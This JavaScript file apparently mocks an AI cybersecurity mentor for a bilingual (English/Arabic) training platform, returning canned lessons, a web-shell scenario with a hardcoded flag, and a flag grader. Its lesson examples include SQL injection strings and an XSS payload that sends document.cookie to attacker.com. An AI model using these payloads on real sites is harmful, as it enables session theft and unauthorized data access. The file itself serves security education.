/**
 * Mock OpenAI Service for Raqeem
 * Provides high-fidelity, context-aware bilingual (EN/AR) simulations of elite AI responses
 * conforming to SANS, CISSP, and MITRE ATT&CK standards when offline or no API Key is active.
 */

class MockOpenAI {
  constructor() {
    this.chat = {
      completions: {
        create: async (payload) => {
          return this.generateCompletion(payload);
        }
      }
    };
  }

  async generateCompletion(payload) {
    const { model, messages, temperature, max_tokens } = payload;
    const systemMessage = messages.find(m => m.role === 'system')?.content || '';
    const userMessage = messages.find(m => m.role === 'user')?.content || '';

    console.log(`[MockOpenAI] Processing request using high-fidelity cybersecurity simulation engine.`);

    // Route requests to appropriate handlers based on prompt clues
    if (systemMessage.includes("You are Raqeem AI Mentor") || systemMessage.includes("You are Wathaq AI Mentor") || systemMessage.includes("You are CyberMind AI Mentor") || systemMessage.includes("Feynman Technique") || systemMessage.includes("Socratic")) {
      return this.wrapResponse(await this.handleMentorRequest(userMessage));
    }

    if (userMessage.includes("experienced cybersecurity hiring manager writing a professional technical resume")) {
      return this.wrapResponse(await this.handleResumeRequest(userMessage));
    }

    if (userMessage.includes("dynamic security training scenario") || userMessage.includes("phishing attack then evolve to suspicious login")) {
      return this.wrapResponse(await this.handleScenarioRequest(userMessage));
    }

    if (userMessage.includes("cybersecurity scoring engine") || userMessage.includes("User submission:")) {
      return this.wrapResponse(await this.handleTaskValidationRequest(userMessage));
    }

    if (userMessage.includes("concise hint for the following task")) {
      return this.wrapResponse(await this.handleHintRequest(userMessage));
    }

    if (userMessage.includes("suggest the next attacker move")) {
      return this.wrapResponse(await this.handleAttackerMoveRequest(userMessage));
    }

    return this.wrapResponse(await this.handleGeneralQuery(userMessage));
  }

  wrapResponse(contentString) {
    return {
      choices: [
        {
          message: {
            content: contentString
          }
        }
      ]
    };
  }

  detectLanguage(text = "") {
    return /[\u0600-\u06FF]/.test(text) ? "ar" : "en";
  }

  async handleMentorRequest(userPrompt) {
    const isArabic = this.detectLanguage(userPrompt) === "ar";
    const lowerPrompt = userPrompt.toLowerCase();
    
    let level = 1;
    let difficulty = "beginner";
    let question = userPrompt;

    const levelMatch = userPrompt.match(/Learner level:\s*(\d+)/i) || userPrompt.match(/Learner Profile Level:\s*(\d+)/i);
    if (levelMatch) level = parseInt(levelMatch[1], 10);

    const diffMatch = userPrompt.match(/Difficulty band:\s*(\w+)/i) || userPrompt.match(/Mapped Difficulty:\s*(\w+)/i);
    if (diffMatch) difficulty = diffMatch[1].toLowerCase();

    const qMatch = userPrompt.match(/Question:\s*([\s\S]+)$/i) || userPrompt.match(/Cyber Question:\s*([\s\S]+)$/i);
    if (qMatch) question = qMatch[1].trim();

    const cleanQ = question.toLowerCase();

    // Default container matching the expected schema
    let responseObj = {
      explanation: "",
      examples: [],
      prevention: [],
      hint: "",
      topic: "",
      difficulty: difficulty
    };

    if (isArabic) {
      if (cleanQ.includes("phishing") || cleanQ.includes("احتيال") || cleanQ.includes("اصطياد")) {
        responseObj.topic = "تحليل ترويسات البريد الإلكتروني وكشف الاصطياد الاحتيالي (Phishing Header Analysis)";
        responseObj.explanation = "الاصطياد الاحتيالي هو ناقل هجوم يعتمد على الهندسة الاجتماعية (Social Engineering) لاختراق الشبكات وتأسيس موطئ قدم أولي (Initial Access - MITRE T1566). يقوم المهاجم بتزوير ترويسات بروتوكول SMTP أو إعداد نطاقات خادعة شبيهة للالتفاف على بوابات حماية البريد الوارد (SEGs) وخداع المستخدم لإجراء عملية مصادقة مزيفة أو تشغيل مرفق ضار.";
        responseObj.examples = [
          "تزوير اسم العرض: إرسال بريد يظهر فيه المرسل كمدير تنفيذي بينما يختلف حقل 'Return-Path' الحقيقي تماماً.",
          "هجمات النطاقات المتشابهة (Lookalike Domains): تسجيل نطاق يشبه النطاق الأصلي للعلامة التجارية لسرقة كلمات المرور.",
          "تهريب كود HTML (HTML Smuggling): إرسال مرفق HTML مشفر كجافا سكريبت ليتم تجميعه كملف تنفيذي ضار محلياً داخل المتصفح."
        ];
        responseObj.prevention = [
          "تطبيق سياسة DMARC بشكل حازم (p=reject) لمنع إرسال رسائل غير مصرح بها باسم النطاق.",
          "إلزامية المصادقة الثنائية المقاومة للاصطياد والتي تستند لمفتاح الأمان FIDO2.",
          "تفحص سجلات 'Received' في ترويسة الرسالة الخام (Raw Headers) للتحقق من هوية ومسار خوادم البريد الوارد."
        ];
        responseObj.hint = "تفحص الترويسة الخام للرسالة وابحث عن حقل 'Authentication-Results'. هل نجحت الرسالة في تجاوز فحوصات SPF و DKIM؟";
      } else if (cleanQ.includes("sql") || cleanQ.includes("حقن") || cleanQ.includes("استعلام")) {
        responseObj.topic = "ثغرات حقن الاستعلامات ومفهوم الحدود البرمجية (SQL Injection Boundary)";
        responseObj.explanation = "تحدث ثغرات حقن SQL عند قيام التطبيق بدمج مدخلات المستخدم مباشرة مع استعلامات قاعدة البيانات الديناميكية دون فلترة وتطهير. يتيح ذلك للمدخلات الخروج من حدود البيانات (Data Context) والدخول في سياق الأوامر (Command Context)، مما يؤدي للتلاعب بـ 'شجرة تحليل الاستعلام' (SQL Syntax Tree) وتنفيذ عمليات غير مصرح بها.";
        responseObj.examples = [
          "التطابق المنطقي (Tautology): إدخال رمز `' OR '1'='1` لتخطي فحص كلمات المرور وسحب أول مستخدم إداري.",
          "حقن UNION: دمج استعلامات إضافية مثل `UNION SELECT null, username, password FROM users --` لسرقة محتويات الجداول الحساسة.",
          "الحقن الأعمى المستند للوقت (Time-Based Blind): إرسال أوامر النوم `pg_sleep(5)` لاستنتاج البيانات حرفاً بحرف عند تعطل قنوات الإرجاع المباشرة."
        ];
        responseObj.prevention = [
          "الاعتماد الإلزامي على الاستعلامات المعلمية (Prepared Statements) لفصل هيكل الاستعلام عن مدخلات المستخدم بالكامل.",
          "تطبيق مبدأ الصلاحيات الأقل (Least Privilege) لحساب الاتصال بقاعدة البيانات وحظر الصلاحيات الإدارية.",
          "تطهير وترميز كافة المخرجات لحظر رسائل الأخطاء التفصيلية لقاعدة البيانات (Detailed Errors) من الظهور للمستخدم."
        ];
        responseObj.hint = "فكر في الحد الفاصل بين البيانات والأوامر. إذا تم تجميع وتفسير استعلام SQL قبل إدراج مدخلات المستخدم فيه، فهل يمكن لبيانات المستخدم تغيير هيكل الاستعلام؟";
      } else if (cleanQ.includes("xss") || cleanQ.includes("حقن نص") || cleanQ.includes("cross")) {
        responseObj.topic = "حقن النصوص البرمجية عبر الموقع وجدران المحتوى (Cross-Site Scripting & CSP)";
        responseObj.explanation = "تنشأ ثغرات XSS عند قيام خادم الويب بدمج مدخلات غير مطهرة ضمن محتوى الصفحة المرسل إلى متصفح المستخدم الضحية. يؤدي ذلك لتشغيل كود جافاسكريبت ضار في سياق جلسة الضحية، مما يمنح المهاجم القدرة على سرقة ملفات الارتباط (Session Cookies) أو تعديل محتوى الصفحة.";
        responseObj.examples = [
          "ثغرات Stored XSS: حقن كود خبيث في حقل تعليقات المدونة ليتم حفظه وتشغيله تلقائياً في متصفح كل زائر.",
          "ثغرات Reflected XSS: إرسال رابط ملغم يستغل مدخلاً تكرارياً غير معقم لتشغيل الكود بمجرد النقر عليه.",
          "سرقة الجلسات النشطة: استخدام دوال جافاسكريبت لسرقة ملفات الارتباط وتمريرها لخادم المهاجم (`document.cookie`)."
        ];
        responseObj.prevention = [
          "تطبيق سياسة أمان المحتوى الصارمة (Content Security Policy) مع استخدام الرموز العشوائية (Nonces) لمنع تشغيل الأكواد المضمنة.",
          "تفعيل سمات الحماية لملفات الارتباط مثل `HttpOnly` لحظر وصول جافاسكريبت للجلسة النشطة.",
          "الترميز المناسب للسياق (Context-Aware Output Encoding) لكل المدخلات قبل عرضها للمستخدم."
        ];
        responseObj.hint = "ال sink الذي يتم كتابة البيانات فيه يحدد كيفية معالجة المتصفح لها. هل تستخدم خاصية آمنة مثل `textContent` بدلاً من الخواص غير الآمنة مثل `innerHTML`؟";
      } else if (cleanQ.includes("nmap") || cleanQ.includes("فحص") || cleanQ.includes("منفذ") || cleanQ.includes("port")) {
        responseObj.topic = "استطلاع الشبكة وفحص المنافذ التكتيكي (Network Reconnaissance & Nmap)";
        responseObj.explanation = "يعتبر فحص الشبكة واستطلاع المنافذ خطوة أساسية في مرحلة الاستطلاع (Reconnaissance - MITRE T1046). تمكن أداة Nmap المختبرين من تحليل المنافذ النشطة، وتحديد أنظمة التشغيل والخدمات العاملة عليها ومطابقتها بالثغرات المعروفة لوضع سيناريوهات الاختراق.";
        responseObj.examples = [
          "الفحص المتخفي SYN Scan (`nmap -sS -p- 10.0.0.1`): إرسال حزم SYN واستقبال الاستجابة دون إكمال مصافحة TCP لمنع تسجيل الفحص.",
          "استخلاص إصدارات الخدمات (`nmap -sV -sC`): جلب البانرات التعريفية للخدمات لتحديد ثغرات الإصدارات القديمة.",
          "فحص الخوادم المفتوحة مثل SSH على المنفذ 22 وقواعد البيانات على المنفذ 5432 المعرضة للإنترنت."
        ];
        responseObj.prevention = [
          "تطبيق جدار حماية صارم وإغلاق كافة المنافذ غير المستخدمة وعزل خدمات قاعدة البيانات.",
          "إعداد أنظمة كشف التسلل (IDS) لإطلاق تنبيهات أمنية عند الكشف عن فحص منافذ متكرر وسريع.",
          "حظر ظهور الترويسات والبانرات التعريفية للخدمات لمنع المهاجمين من استنتاج إصدارات الأنظمة بسهولة."
        ];
        responseObj.hint = "البوابات المفتوحة هي المدخل الأساسي لأي نظام. ما هو دور جدار الحماية في التحكم بما يمر عبر هذه الأبواب وكيف تفرق بين فحص SYN وفحص TCP Connect؟";
      } else {
        responseObj.topic = "أسس وأصول الدفاع السيبراني التكتيكي";
        responseObj.explanation = "يتطلب أمن المعلومات بناء استراتيجيات دفاعية شاملة تعتمد على مبدأ الدفاع متعدد الطبقات (Defense in Depth) ومبدأ الثقة المعدومة (Zero Trust). الدفاع السيبراني لا يعتمد على حماية ثغرة واحدة بل على بناء جدران عازلة ومسارات مراقبة مستمرة للحد من آثار الاختراقات الأمنية.";
        responseObj.examples = [
          "تطبيق بروتوكولات حظر الوصول غير المصرح به للشبكات الداخلية.",
          "تشفير البيانات الحساسة أثناء النقل والتخزين لتقليل آثار سرقة البيانات.",
          "مراقبة السلوك غير الطبيعي للمستخدمين والخدمات للحد من الاختراقات في مهدها."
        ];
        responseObj.prevention = [
          "التحقق والتوثيق الصارم لكافة عمليات الوصول للأنظمة والبيانات.",
          "الاحتفاظ بنسخ احتياطية دورية معزولة عن الشبكة الأساسية لتفادي برمجيات الفدية.",
          "بناء سياسات تدريبية وتدريبات محاكاة مستمرة لرفع الوعي الأمني للكوادر البشرية."
        ];
        responseObj.hint = "تذكر دائماً: المدافع يحتاج لحماية كافة الثغرات، بينما يحتاج المهاجم لثغرة واحدة فقط للعبور. كيف نصعب مهمة المهاجم باستخدام الدفاع متعدد الطبقات؟";
      }
    } else {
      // English Elite responses
      if (cleanQ.includes("phishing") || cleanQ.includes("social engineering")) {
        responseObj.topic = "Phishing Header Analysis & Social Engineering Defense (MITRE T1566)";
        responseObj.explanation = "Phishing is an initial access technique exploiting human trust boundaries. Attackers spoof displays, configure homograph lookalike domains, or manipulate raw Mail Transfer Agent (MTA) headers to deliver malware or steal credentials, bypassing standard perimeter gateways.";
        responseObj.examples = [
          "Display Name Spoofing: Masking the actual envelope sender in the headers while setting the display name to a trusted executive.",
          "HTML Smuggling: Leveraging browser features to assemble obfuscated malicious payloads locally within the victim's web browser, bypassing traditional email security gateways.",
          "Open Redirect Exploits: Crafting trusted brand URLs that leverage redirect flaws to forward users to credential harvesting portals."
        ];
        responseObj.prevention = [
          "Enforce strict DMARC record policies with explicit 'reject' alignment constraints.",
          "Deploy FIDO2/WebAuthn phishing-resistant multi-factor authentication (MFA) across all identity providers.",
          "Audit inbound relay servers by checking the sequence of hops in the 'Received' email headers."
        ];
        responseObj.hint = "Open the raw email headers and inspect the 'Received' logs. Does the relay IP chain originate from the authentic domain server?";
      } else if (cleanQ.includes("sql") || cleanQ.includes("injection")) {
        responseObj.topic = "SQL Injection (SQLi) & Lexical Query Boundaries";
        responseObj.explanation = "SQL Injection occurs when dynamic concatenation merges untrusted user input directly into executable database strings. This allows inputs to escape the intended data context and cross over into the command context, altering the SQL parser's syntax tree.";
        responseObj.examples = [
          "Tautology Injection: Inputting `' OR '1'='1` to force dynamic database query conditions to evaluate to true, bypassing validation steps.",
          "UNION Enumeration: Appending `UNION SELECT null, username, password FROM users --` to merge unauthorized tables into active UI renders.",
          "Time-Based Blind: Forcing database engines to perform execution loops (`pg_sleep(5)`) to infer table names when direct returns are blocked."
        ];
        responseObj.prevention = [
          "Consistently utilize Parameterized Queries (Prepared Statements) to bind parameter variables strictly as literal data.",
          "Apply least-privilege configurations to database accounts, blocking administrative access from web applications.",
          "Disable verbose database error outputs in production environments to prevent schema leakage."
        ];
        responseObj.hint = "Think about Prepared Statements. Why does compiling the query structure *before* binding input prevent SQL parser manipulation?";
      } else if (cleanQ.includes("xss") || cleanQ.includes("cross")) {
        responseObj.topic = "Cross-Site Scripting (XSS) & Browser Context Protections";
        responseObj.explanation = "Cross-Site Scripting occurs when an application dynamic echoes unsanitized input into web pages. The client browser interprets the payload as executable JavaScript, executing scripts within the security context of the victim's web session.";
        responseObj.examples = [
          "Stored XSS: Injecting `<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>` into public forum posts, stealing session tokens from all visitors.",
          "Reflected XSS: Crafting custom links with embedded JavaScript payloads that echo from server responses to execute immediately upon user clicks.",
          "DOM-Based XSS: Client-side routing scripts reading values from unsafe sources (like `window.location.hash`) and writing them directly into unsafe sinks (like `innerHTML`)."
        ];
        responseObj.prevention = [
          "Deploy a strong, nonce-based Content Security Policy (CSP) blocking inline script execution.",
          "Configure the `HttpOnly` flag on session cookies to block client-side script framework access.",
          "Enforce context-aware output encoding across all templates (HTML, attribute, script, and CSS contexts)."
        ];
        responseObj.hint = "Sinks matter. If an application utilizes `element.textContent` instead of `element.innerHTML`, how does the browser handle HTML tags?";
      } else if (cleanQ.includes("nmap") || cleanQ.includes("scan") || cleanQ.includes("port") || cleanQ.includes("recon")) {
        responseObj.topic = "Network Reconnaissance & Active Port Auditing (Nmap Dynamics)";
        responseObj.explanation = "Active Port Scanning (MITRE T1046) maps network topologies, finding active hosts and vulnerable daemon interfaces. Using Nmap allows security teams and attackers to find active TCP/UDP ports, perform OS discovery, and audit banner definitions for exposures.";
        responseObj.examples = [
          "TCP SYN Stealth scan (`nmap -sS -p- 10.0.0.1`): Scanning without completing the three-way handshake, reducing log registration.",
          "Service Banner Grabbing (`nmap -sV -sC 10.0.0.1`): Interrogating active service ports to capture version tags for vulnerability mapping.",
          "Discovering exposed sensitive ports: Exposed SSH (22), databases (3306, 5432), and remote management APIs."
        ];
        responseObj.prevention = [
          "Harden firewalls to block all non-essential ports and enforce network isolation for database subnets.",
          "Deploy Intrusion Detection Systems (IDS) calibrated to alert on high-frequency connection patterns.",
          "Modify daemon settings to disable verbose service banners, hiding running engine versions."
        ];
        responseObj.hint = "Consider the TCP handshake. What packets are exchanged during a SYN scan vs. a standard TCP Connect scan?";
      } else {
        responseObj.topic = "Core Defensive Cybersecurity Architecture";
        responseObj.explanation = "Defensive architecture relies on layered resilience. By combining the Zero Trust framework (never trust, always verify) and robust Defense in Depth, organizations build redundant layers of technical, administrative, and physical controls to limit attacker movement.";
        responseObj.examples = [
          "Isolating network segments to contain lateral movement during incident scenarios.",
          "Deploying centralized log aggregation and security correlation (SIEM) to detect initial access.",
          "Restricting privilege levels for standard accounts to limit privilege escalation paths."
        ];
        responseObj.prevention = [
          "Enforce regular credential updates, strong password complexities, and mandatory MFA.",
          "Keep all production systems updated and isolate outdated legacy endpoints in secure subnets.",
          "Conduct continuous red team simulations and structured incident response walkthroughs."
        ];
        responseObj.hint = "If one security boundary is compromised, how does the next layer of security prevent the threat from spreading?";
      }
    }

    return JSON.stringify(responseObj, null, 2);
  }

  async handleResumeRequest(userPrompt) {
    const isArabic = this.detectLanguage(userPrompt) === "ar";
    if (isArabic) {
      return "مهندس وممارس أمن سيبراني واعد. يتميز بالكفاءة العالية في إجراء فحوصات استكشاف الشبكات المتقدمة باستخدام Nmap وكشف ومكافحة ثغرات الويب الحرجة مثل SQL Injection و XSS. أظهر مهارات تحليلية وتكتيكية استثنائية في تقييم ترويسات البريد الإلكتروني لكشف الاصطياد الاحتيالي، بالإضافة لعزل التهديدات وتنفيذ قواعد جدران الحماية للحد من هجمات الاختراق وحماية بيئات العمل الحيوية وفق أعلى معايير أطر العمل الأمنية.";
    } else {
      return "Highly motivated cybersecurity practitioner with verified operational competency in network discovery, service auditing, and web security remediation. Demonstrates advanced technical analysis in inspecting raw SMTP headers to contain phishing campaigns, mitigates injection vulnerabilities (SQLi, XSS) using prepared statements, and establishes network-level containment controls utilizing iptables.";
    }
  }

  async handleScenarioRequest(userPrompt) {
    const scenario = {
      title: "Incident Auditing: Web Shell Detection & Containment",
      description: "A threat actor has successfully uploaded a PHP-based web shell through an unrestricted file upload endpoint in a public-facing web server. You must locate the web shell script in the public directories, audit Apache access logs to isolate the attacker's source IP, and deploy firewall rules to block the threat source.",
      phases: [
        "Audit public server directories (e.g. /var/www/uploads/) for anomalous files and inspect script hashes.",
        "Inspect Apache access.log for high-frequency anomalous POST requests directed at suspicious uploaded files.",
        "Deploy iptables packet filter rules to drop all connections originating from the attacker's isolated source IP.",
        "Modify application parameters to sanitize upload inputs, enforcing file-type validation and disabling script execution permissions in upload directories."
      ],
      expected_flag: "FLAG{webshell_hunted_and_contained_4492}"
    };

    return JSON.stringify(scenario, null, 2);
  }

  async handleTaskValidationRequest(userPrompt) {
    let expected = "";
    let submission = "";

    const expMatch = userPrompt.match(/Expected output:\s*([^\n]+)/i) || userPrompt.match(/Expected:\s*([^\n]+)/i);
    if (expMatch) expected = expMatch[1].trim();

    const subMatch = userPrompt.match(/User submission:\s*([^\n]+)/i) || userPrompt.match(/Submission:\s*([^\n]+)/i);
    if (subMatch) submission = subMatch[1].trim();

    const cleanSub = submission.trim().toLowerCase();
    const cleanExp = expected.trim().toLowerCase();

    let isCorrect = false;
    let confidence = 20;
    let feedback = "";

    // 1. Direct Flag Match
    if (cleanExp && cleanSub === cleanExp) {
      isCorrect = true;
      confidence = 98;
      feedback = "Outstanding! The submission matches the expected flag perfectly. Excellent eye for detail!";
    } else if (cleanSub.includes("flag") && cleanSub.includes(cleanExp.replace(/flag\{|\}/g, ""))) {
      isCorrect = true;
      confidence = 95;
      feedback = "Correct flag detected! Fantastic job navigating the sandbox environment!";
    } else {
      // 2. Command Analysis Heuristics - Check if the user is typing commands instead of the flag
      isCorrect = false;
      confidence = 30;

      if (cleanSub.includes("nmap")) {
        if (!cleanSub.includes("-ss") && !cleanSub.includes("-st")) {
          feedback = "Command validation detected Nmap usage, but a critical scan-type flag (such as TCP SYN stealth scan -sS) is missing. Rushing standard scans exposes your IP to host detection IDS alerts.";
        } else if (!cleanSub.includes("-sv")) {
          feedback = "Stealth flags are correct, but the banner-grabbing version detection flag (-sV) is missing. The scanner is not extracting the running daemon version parameters necessary for exploit mapping.";
        } else {
          feedback = "Stealth scan parameters configured correctly, but you need to submit the actual flag retrieved from the scan output or host file to satisfy the scoring engine.";
        }
      } else if (cleanSub.includes("iptables")) {
        if (!cleanSub.includes("-a") && !cleanSub.includes("-i")) {
          feedback = "Firewall modification command detected, but rule placement parameters are incorrect. Ensure you append rules to the INPUT chain (-A INPUT) to filter incoming threat packets.";
        } else if (!cleanSub.includes("drop") && !cleanSub.includes("reject")) {
          feedback = "Command targets the input chain, but you have not specified a target action (DROP/REJECT). Unfiltered packets will still reach the server processes.";
        } else {
          feedback = "iptables command looks correct, but you must submit the target flag indicating success.";
        }
      } else if (cleanSub.includes("select") || cleanSub.includes("union") || cleanSub.includes("insert")) {
        feedback = "SQL fragment detected. The injection attempt failed. You may have an syntax error in your single quotes or the column counts do not align with the primary database query.";
      } else {
        feedback = "The submitted value does not match the target objective. Ensure you run the scans, inspect the configuration parameters, or extract the correct flag exactly as instructed.";
      }
    }

    return JSON.stringify({ isCorrect, confidence, feedback }, null, 2);
  }

  async handleHintRequest(userPrompt) {
    return "💡 Try focusing on anomalous activity. Check the latest log lines or use filter parameters to isolate traffic from the targeted host.";
  }

  async handleAttackerMoveRequest(userPrompt) {
    if (userPrompt.toLowerCase().includes("password") || userPrompt.toLowerCase().includes("hash") || userPrompt.toLowerCase().includes("shadow")) {
      return "Credential Access (MITRE T1003 - Credential Dumping)\nHaving established local user access, the attacker is targeting hashes or tokens in cache memory or system configurations to expand their cryptographic control.";
    }
    if (userPrompt.toLowerCase().includes("recon") || userPrompt.toLowerCase().includes("scan") || userPrompt.toLowerCase().includes("nmap")) {
      return "Lateral Movement (MITRE T1021 - Remote Services)\nWith the active internal subnet mapped out, the threat agent will attempt to establish connections across other directory nodes using stolen credentials.";
    }
    return "Exfiltration (MITRE T1048 - Exfiltration Over Alternative Protocol)\nHaving successfully compromised the target database repository, the attacker is staging sensitive data to exfiltrate it via alternative protocols (DNS/HTTP).";
  }

  async handleGeneralQuery(userPrompt) {
    const isArabic = this.detectLanguage(userPrompt) === "ar";
    if (isArabic) {
      return "مرحباً! أنا مرشد الأمن السيبراني التكتيكي من منصة رقيم | Raqeem. كيف يمكنني مساعدتك اليوم في استكشاف ثغرات الويب، فحص الشبكات، أو إعداد جدران الحماية؟";
    } else {
      return "Hello! I am your Raqeem AI Assistant (رقيم). I can guide you through hands-on terminal commands, SQL injection mitigations, and network protection setups. What cybersecurity domain would you like to explore today?";
    }
  }
}

module.exports = MockOpenAI;
